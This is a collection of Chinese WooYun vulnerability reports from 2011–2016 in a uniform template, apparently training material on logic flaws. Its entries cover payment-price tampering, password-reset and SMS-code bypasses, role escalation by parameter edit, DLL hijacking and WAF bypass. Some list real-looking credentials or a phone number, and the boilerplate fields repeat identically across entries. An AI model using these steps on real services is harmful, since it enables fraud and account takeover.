**详情**: 但是在java里面直接写出加密方式， 以及可显示字符的key 。 这样岂不是敞开大门么.apk 解包反编译java的代码中给出加密方式\com\square_enix\million\util\Crypt.java:18    public static byte[] decode(byte[] paramArrayOfByte1, byte[] paramArrayOfByte2)19    {20:     SecretKeySpec localSecretKeySpec = new SecretKeySpec(paramArrayOfByte2, "AES");21      try22      {23:       Cipher localCipher = Cipher.getInstance("AES/ECB/PKCS5Padding");24        localCiph

**POC**: This XML file does not appear to have any style information associated with it. The document tree is shown below.<response><header><error><code>0</error><session_id>FFFFFFFFFF</session_id><revision>...</revision><mainbg><pack_name>mainbg_70_sp</pack_name><band>1,5,11,21,31,41,51,61,71,81,91</band></

**绕过**: 直接利用

**修复**: 加密方式移除java， 全部放在so中。 利用callback 返回数据。so中加密key使用非可显字符， 然后混淆加密方式。需要联系se 重新发包。
---

---
### [wooyun-2015-090764] 某电商平台安全插件导致部分EVSSL证书不能使IE地址栏变绿
**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我用Process Monitor跟踪了某电商平台插件（版本号：[IP已脱敏]2）的安装过程，发现安装程序向 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates 写入了三个新键值：这三个新键值实质上是向操作系统导入了三个根证书：Alibaba.com Corporation Root CA 、VeriSign Class 3 Public Primary Certification Authority - G5 、UTN-USERFirst-Object。出问题的就是那个VeriSign的证书，因为只有VeriSign签发的EVSSL证书不能让IE显示绿色地址栏，而其他CA签发的EVSSL证书均可以。原因在于，本身Windows系统中有VeriSign G5的根证书，同时系统中记录了它的EV 

**POC**: 安装某电商平台安全插件前，打开https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 别导入VeriSign G5根证书。https://example.com/[已脱敏] 证书链的根证书就是你们导入的根证书，所以说能上得了你们官网就说明系统里已经有那个根证书。而安全插件又是从你们官网上下载的，所以导入它有什么积极用处？
---

---
### [wooyun-2015-0134720] 桔子浏览器下载功能未限制同源可造成RFD攻击
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 具体请看原理https://example.com/[已脱敏] 某搜索引擎浏览器下载功能未限制同源可造成RFD攻击WooYun: UC浏览器下载功能未限制同源可造成RFD攻击浏览器模式下打开https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这样这个漏洞形成的原因就很简明了，要符合几个条件：1.在返回中能看到我们的输入并且content-type的类型不是普通类型，json或者jsonp等等。。。2.url没有过滤或转义‘/’‘;’3.是下载类型。使用不完整的Content-Disposition:attachment或者是不符合htt
---

---
### [wooyun-2015-0158008] 某广播电视台设计逻辑缺陷导致内部信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 柳州广播电视台办公自动化系统地址：http://**.**.**.**:8000/无验证码 可爆破：有一个弱口令：账号：zhanghui密码：zhanghui123登录：

**POC**: 张辉：

**绕过**: 直接利用

**修复**: 改密码
---

---
### [wooyun-2013-045145] 新版12306网站存在多个订票逻辑漏洞
**厂商**: 中国铁道科学研究院 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 如图 假设我需要定16点起售的K46次列车 由于没到16点 因此界面没有预定按扭随便找一个有票的日期 点击预定按扭使用发包拦截工具拦截发包 修改订票日期成功修改日期 在16点之前看到了订票页面这时试图提交下订单 当然提示0张 因为还没开始卖 接下来 不断的刷验证码啊刷 等待16点的到来16:00:00到了 这时候出票了 准时提交订单最终订票成功 由于浏览器和操作等的原因 可能显得慢点 如果直接用代码实现 应该是在整点过个2 3秒就能买到票了 而这个时候 大家可能都在填验证码呢。

**POC**: 参见上面的详细说明。

**绕过**: 直接利用

**修复**: 修改提交订单验证机制
---

---
### [wooyun-2012-08829] 高校杂志社网站存在支付漏洞
**厂商**: 《高校招生》杂志社 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 对支付过程相关代码的审计存在缺陷，导致漏洞产生。会导致允许用户对支付金额进行修改。

**POC**: 这是未付款时的提示信息这是付款页面，可以通过工具把金额修改成任意金额。付款成功，重新登录之后就可以查看网站所有付费数据了。

**绕过**: 直接利用

**修复**: 使用签名检验，不直接POST支付所需金额
---

---
### [wooyun-2016-0166444] 自化创意设计逻辑缺陷导致任意手机注册
**厂商**: 自化创意 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.可以用任意没有注册的手机号码注册该网站的新账号2.可以修改任意通过手机号码注册的账号的密码。网站域名 http://**.**.**.**/1.下图是手机注册页面2.正常填写表单，点击发送验证码，浏览器工具看下http请求可怕的是 ，返回了一个code，存在了页面的dom对象属性中，这是个什么鬼，看起来是md5后的3.js文件里翻啊翻，找到了这个天了噜，放在客户端验证。4.随便找了个朋友的手机号码，拿到返回的code，六位纯数，验证下注册成功5.最可怕的是这个找回密码跟注册一模一样的。

**POC**: 成功来到修改密码页面

**绕过**: 直接利用

**修复**: 验证码 怎么能放在客户端验证呢，加密验证逻辑都暴露在js中。
---

---
### [wooyun-2015-0100148] 某搜索引擎浏览器下载功能未限制同源可造成RFD攻击
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在浏览器中打开这个：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这样这个漏洞形成的原因就很简明了，要符合几个条件：1.在返回中能看到我们的输入并且content-type的类型不是普通类型，json或者jsonp等等。。。2.url没有过滤或转义‘/’‘;’3.是下载类型。使用不完整的Content-Disposition:attachment或者是不符合htt
---

---
### [wooyun-2015-0116446] 某外卖平台某处支付漏洞一枚
**厂商**: 某外卖平台网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 主机-新建云主机

**POC**: 抓包一直forward修改total_fee参数发送

**绕过**: 直接利用

**修复**: 没做过某电商平台接口  不知道
---

---
### [wooyun-2015-0129722] 蜗牛网支付逻辑漏洞
**厂商**: 蜗牛 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2015-0153680] 优信二手车设计逻辑缺陷导致任意帐号登录／重置用户密码
**厂商**: xin.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意帐号登录，而且不用验证，登录后还能修改密码。首先需要手机号，通过参考：WooYun: 优信二手车登录位置设计不严谨可撞库通过API遍历一些手机号：有些非正常的手机号，也能登录无须验证。。。。非正常手机293238429测试一下，首页选择网站密码登录(输入正常的手机号抓包后替换)，进行抓包：login值改为c(短信随机码登录)其他貌似还有login和p登录如图：修改密码的话，如图提示：通过短信随机码登录的用户，请使用忘记密码功能来修改密码。这一不用管，原密码随便写下，然后重置为：wooyun123

**POC**: 随便找了两个，密码重置为wooyun123：

**绕过**: 直接利用

**修复**: 你们更专业。
---

---
### [wooyun-2015-0153581] 潇湘通某处设计逻辑缺陷（13W学员信息/多个系统帐号泄露）
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 传送门：http://**.**.**.**/没事扫了一下域名，发现一个CRM系统... 然后就弱密码爆破成功了...test  1234后台管理系统友盟站长统计

**POC**: 然后不小心看到了13W多的个人信息……

**绕过**: 直接利用

**修复**: 今天双11
---

---
### [wooyun-2015-094243] Xrush网游加速器某处逻辑漏洞(已成功登录）
**厂商**: Xrush网游加速器 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: inurl:inurl:https://example.com/[已脱敏]

**POC**: 贴几个https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-019173] 酷听网多处支付漏洞
**厂商**: 酷听网 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 充值中心，VIP原价30元抓包改价格酷听商城，耳机原价365抓包改价格瞬间变一毛，，

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0162655] 银泰商业集团某设计逻辑缺陷导致敏感信息泄露
**厂商**: 银泰商业集团 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 账号：fhytc    密码：fhytc123

**绕过**: 直接利用

**修复**: 。。。。
---

---
### [wooyun-2014-065445] 我是如何花1分钱购买ipad的（某电器网上商城支付漏洞）
**厂商**: 某电器网上商城 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 访问手机url某电商平台支付的时候  不允许pc端支付， so   伪造iphone user-agent

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1.加token2.直通付款接口
---

---
### [wooyun-2014-060273] 某搜索引擎卫士文件保护绕过
**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用文件系统特性可以绕过某搜索引擎卫士文件防护。和某互联网公司管家的绕过一样利用了硬链接，不过更加简单。以某搜索引擎卫士自身的某配置文件为例。代码就不单独给出了，图里有了。原始文件截图：释放批处理并执行：修改成功：

**POC**: 利用文件系统特性可以绕过某搜索引擎卫士文件防护。和某互联网公司管家的绕过一样利用了硬链接，不过更加简单。以某搜索引擎卫士自身的某配置文件为例。代码就不单独给出了，图里有了。原始文件截图：释放批处理并执行：修改成功：

**绕过**: 过滤绕过

**修复**: 对硬链接加入防护吧，完全一点防护都没有啊。
---

---
### [wooyun-2011-01921] 捷易通自动充值软件 密码加密算法过于简单
**厂商**: 捷易通 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 捷易通自动充值软件 将用户登录密码加密后保存在软件目录下的config.ini文件中，加密算法过于简单，导致用户密码极易被破解

**POC**: nb sa fa Rb cc Ab Lb ld Nd 9amb ta ea Qb dc Bb Kb kd Md 8alb qa ha Pb ac 8b Nb nd Ld 7akb ra ga Ob bc 9b Mb md Kd 6arb wa ba Vb Yb Eb Hb hd Rd Daqb xa aa Ub Zb Fb Gb gd Qd Capb ua da Tb Wb Cb Jb jd Pd Baob va ca Sb Xb Db Ib id Od Aafb 0a na Zb Ub Ib Db td Fd Haeb 1a ma Yb Vb Jb Cb sd Ed Ga以上分别是密码0-9

**绕过**: 直接利用

**修复**: 更换密码加密算法
---

---
### [wooyun-2015-0135164] 某电商平台主站逻辑缺陷不花钱买买买
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: IOS app 某电商平台V3.3.4购物-立即购买-添加苏宁卡-添加完成会有这么个请求POST https://example.com/[已脱敏] HTTP/1.1Host: cart.suning.comContent-Type: application/x-www-form-urlencoded; charset=utf-8Connection: closeUser-Agent: 某电商平台 3.3.4 rv:[IP已脱敏] (iPhone; iPhone OS 8.4.1; zh_CN)Content-Length: 105Accept-Encoding: gzipConnection: closecatalogId=10051&storeId=10052&validateCode=&v

**POC**: 关注优惠金额 和支付金额支付成功web端

**绕过**: 直接利用

**修复**: 订单我会主动取消，真别发货，谢谢
---

---
### [wooyun-2015-0122518] 中国知网支付逻辑漏洞（已证明1分钱购买商品）
**厂商**: 中国知网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 如上

**绕过**: 直接利用

**修复**: 改
---

---
### [wooyun-2015-0165205] 松鼠家手机APP逻辑缺陷导致用户信息泄漏
**厂商**: 杭州浪尖网络科技有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 跪求一枚邀请码。。————以下正文————松鼠家，发现全球美食，专做全球进口零食、生鲜的APP。安卓市场里看了下，购物里排第3页，10w+的热度，看来用的人还不少点开忘记密码界面，输入妹子手机号，获取验证码，抓包：明文传的，发现了手机号和我输入的验证码。。暴力破解一下。如图：密码重置成功了。。登录看一下，定单：和好吃的。。

**POC**: 如上

**绕过**: 直接利用

**修复**: 限制验证码提交次数。
---

---
### [wooyun-2015-0104587] 沈阳网安技术旗下DIYCDN支付逻辑漏洞
**厂商**: 沈阳网安技术 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看图吧！1503/291459302f6c038b2c150e77dc63a5264d8b4755.png" alt="图片7.png" /><img src="https://example.com/[已脱敏]

**POC**: 变多了哦

**绕过**: 直接利用

**修复**: 可以把money去了，我记得提交的有这么一段，flux_name=flux_1300G，可以搞个ID什么提交也可以啊！
---

---
### [wooyun-2015-0130345] 某手机厂商商城之绕过短信验证码并任意重置密码
**厂商**: 某通信设备厂商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 进入某手机厂商商城的找回密码界面，输入正确手机号和验证码，并点击下一步，这个过程称为流程1！对应的URL：https://example.com/[已脱敏]

**POC**: 因此我进行的重置密码流程如下：输入手机号和验证码然后在URL输入https://example.com/[已脱敏]

**绕过**: 过滤绕过

**修复**: 流程2验证后添加一个验证标志以进入流程3
---

---
### [wooyun-2012-04006] 360手机桌面1.5.1-beta烦人小BUG
**厂商**: 某安全厂商 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 手机具备上下左右导航按键时，同时按下会解锁。。说实话。。等了论坛回复好久了。。顺便要个激活码。。嘿嘿。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-019380] 胶南人民医院自助查询机终端机绕过
**厂商**: 胶南市人民医院 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 长按屏幕出现右键

**POC**: 长按某处弹出右键，测试打印机无效（求方法），果断查看源码查看源码结果~~人品系统随便进，还联网呢，医院数据好多，不解释了，因为等查询人太多，没深入！不会说话，逻辑不清楚，请见谅！

**绕过**: 直接利用

**修复**: 1.把开发商给开发了2.你们比我清楚
---

---
### [wooyun-2015-0139673] 支付安全之泛华保险0.1元购险不是梦（支付漏洞）
**厂商**: 泛华保险服务集团 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.地址 https://example.com/[已脱敏] 先注册帐号登入2.随便选个保险选择10份，是1000元此时抓包修改很完美的0.1前面不能说明什么，看订单不过由于支付接口错误，好像不能支付 是刚开发的网站吗？

**POC**: 1.地址 https://example.com/[已脱敏] 先注册帐号登入2.随便选个保险选择10份，是1000元此时抓包修改很完美的0.1前面不能说明什么，看订单不过由于支付接口错误，好像不能支付 是刚开发的网站吗？

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-046851] 千牛手机客户端绕过手势密码漏洞
**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 详细内容如下：第一脚：为了安全起见，千牛添加了打开软件出现手势密码，但是只有5次尝试机会第二脚：于是闲的蛋疼试了5次第三脚：但是，试了5词之后，见证奇迹的时候到来了，看下图，居然出现了两个号码，其中一个就是登录帐号，点击下面的帐号，完美登录第四脚：新建手势密码

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的比我多
---

---
### [wooyun-2013-036990] 暴风影音播放器存在DLL劫持漏洞
**厂商**: 暴风影音 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试时默认安装路径：C:\Program Files\Baofeng\打开BFVKanDianYing.exe时会加载三个处不存在的DLL文件，分别是：C:\Program Files\Baofeng\BFVKanDianYing\dbgcrtoutputlog.dllC:\Program Files\Baofeng\BFVKanDianYing\bin\logurls.dllC:\Program Files\Baofeng\BFVKanDianYing\ieframe.dll以上任一DLL文件与BFVKanDianYing.exe放在对应的目录，这样就可以在运行BFVKanDianYing.exe的时候会同时加载对应的DLL，这个DLL可以为自制的任意内容的dll。此方法可用于劫持运行某些程序（木马病毒）。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2012-04799] 北京市卫生局网上预约挂号平台短信验证发送未作限制以及重复发送BUG
**厂商**: 北京市卫生局网上预约挂号平台 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 简单测试了一下，系统也没有对发送的时间间隔、发送次数，进行限制。本来提交一次就会发送2次，这一放大，就是个短信轰炸机。考虑到周末以及反应速度不是很快，漏洞细节就不说了，大家都应该清楚。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制发送间隔和发送测试。
---

---
### [wooyun-2015-0104499] 支付漏洞似乎并没有修复完善
**厂商**: jiajiao400.com | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 选个开通吧～99的GET /alipay/vip/alipayto.php?aliorder=%25E5%25B8%25B8%25E9%259D%2592%25E8%2597%25A4%25E5%25AE%25B6%25E6%2595%2599%25E7%25BD%2591%25E2%2580%2594%25E2%2580%2594%25E6%2594%25AF%25E4%25BB%2598VIP%25E4%25BC%259A%25E5%2591%2598%25E8%25B4%25B999%25E5%2585%2583&alibody=&alimoney=99&trade_no=20150328104402&pay_bank=CCB HTTP/1.1Host: www.jiajiao400.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64;

**POC**: (见原文)

**绕过**: 截断攻击

**修复**: 话说真的是漏洞吗。站长你查查。可爱的站长你会给礼物给高rank吗？
---

---
### [wooyun-2013-046799] 某电商平台陕西信合快捷支付业务问题
**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商平台快捷支付绑定陕西信合快捷支付在信合没有余额的情况下会显示充值成功。但是某电商平台余额不会增加，也就是显示上有逻辑错误。不知道其他的网银有没有类似问题。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 暂时不知道对应修复方案，感觉属于业务逻辑处理问题。
---

---
### [wooyun-2015-0114962] 翼龙贷随意更改用户密码漏洞（逻辑漏洞非爆破）
**厂商**: eloancn.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第一步：找回密码处，点击发送验证码，随便输入错误的验证码，抓包：将错误的返回码记下来。第二部：输入正确的验证码，抓包：第三步：输入成正确的验证码，进去之后，输入新密码，抓包：第四部：我随便在你们网站找了个客服的电话：13601303959。就搞他了。重复上面第一步，抓错误的包：返回错误的包，改成正确的包再发送（这个步骤一定要注意，必须手动点下发送验证码。要不然后台生成不了验证码，自然会出错）——》 进入编辑密码页面，输入咱们的密码，GO，继续抓包。第五步：应该是返回正确的封包。如果返回错误，就把第三步，截取的封包复制进去再发送。最后：

**POC**: 这是你们那个客服的用户界面。点到为止。求礼物！求RANK~别小气~

**绕过**: 直接利用

**修复**: 建议把验证码的验证步骤，放到最后一步修改密码处。同时交给后台处理。前台的验证都不可靠！
---

---
### [wooyun-2012-04930] 某国有银行android客户端设计逻辑缺陷导致用户被钓鱼
**厂商**: 某国有银行 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: (1)建行主页有一系列的服务（2）但是这些服务所对应地址均写在配置文件，把配置文件稍微修改一下，定机票就可以变成（3）之后应用里面就会进入这些钓鱼界面

**POC**: 如上

**绕过**: 直接利用

**修复**: 这种涉及界面和程序逻辑的东西还是不要直接明文写在配置文件里吧
---

---
### [wooyun-2014-066244] 绿盟远程安全评估系统逻辑漏洞直接进入管理通杀之一
**厂商**: 某安全厂商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 默认2个帐号：reporter，auditor密码是nsfocus。用普通帐号登陆，修改密码处，user%5Baccount%5D=admin&user%5Bname%5D=Admin&user%5Bpassword%5D=admin123&user%5Bpassword.confirm%5D=admin123&user%5Bmail%5D=admin%40example.com&user%5Broles%5D=ADMINISTRATORS&user%5BallowLoginIp%5D=*.*.*.*&user%5BallowScanIp%5D=*.*.*.*&user%5BmaxTask%5D=1501 处修改ADMINISTRATORS2 处修改 帐号 admin 就可以了。最后即可admin登陆。

**POC**: 如上

**绕过**: 直接利用

**修复**: 程序开发人员修改下。加上码。
---

---
### [wooyun-2014-063025] 12306逻辑漏洞：可批量修改账号他人密码
**厂商**: 中国铁道科学研究院 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这两天在写一个HTTP扫描器，顺便拿12306测试。 发现一处逻辑缺陷，找回密码的功能位于：https://example.com/[已脱敏] 用户名 / 邮箱。输入用户名，点击提取问题，只要返回的existError为N，均是存在的用户。 12306用户太多，大量猜解毫不费力，包括去猜解留了公司邮箱的人。@baidu.com、@youku.com等。 得到这些员工的个人信息，拿到后可以社工，设法渗透对应的商业公司（只是思路，(⊙o⊙)）。2，找回密码的地方验证码没有立即过期。这是常见的验证码缺陷，问题也很严重。因为验证码可以反复使用，直接被绕过了。个人估计12306是考虑到了性能的关系，才没让它立即过期。3，通常密码提示答案都非常简单。  早些年通过回答问题破解163邮箱也蛮容易的

**POC**: 常用联系人泄露他人身份证和手机：

**绕过**: 过滤绕过

**修复**: 因为你们更专业，就不多说了
---

---
### [wooyun-2015-0105331] ZARA品牌商城支付漏洞
**厂商**: 爱特思电子商务（上海）有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: ！
---

---
### [wooyun-2012-010047] 智创网站专业级防火墙可被绕过
**厂商**: 智创 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入, 上传功能, 后台管理

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 随着各种工具的出现，导致对web漏洞利用很容易，而web程序员很多不会对所有web漏洞都非常了解，而且培训的成本也是很高的，因此，有些站点都是依靠第三方程序来使得站点尽量安全。而第三方程序为了兼容后面的各种web环境，因此一般都是在网络层防护，类似waf等，而智创应该算是一种。这种防护理论上来说很好，即使后台程序漏洞在多，危害再大，然而攻击请求在没有触发漏洞之前都会被网络层的waf等防护拦截。但是waf本身 就是一些规则，如果规则匹配失败，就会放行，如果一种情况没有考虑到，就会被绕过。前人已经总结很多了，这里就不说了。这里主要利用iis对asp后参数串进行url解码的特性绕过智创防火墙。构造如下请求:https://example.com/[已脱敏]

**POC**: 如上

**绕过**: 过滤绕过

**修复**: 见文档
---

---
### [wooyun-2015-0144604] 某证券软件爱基金客户端之本地用户信息明文存储
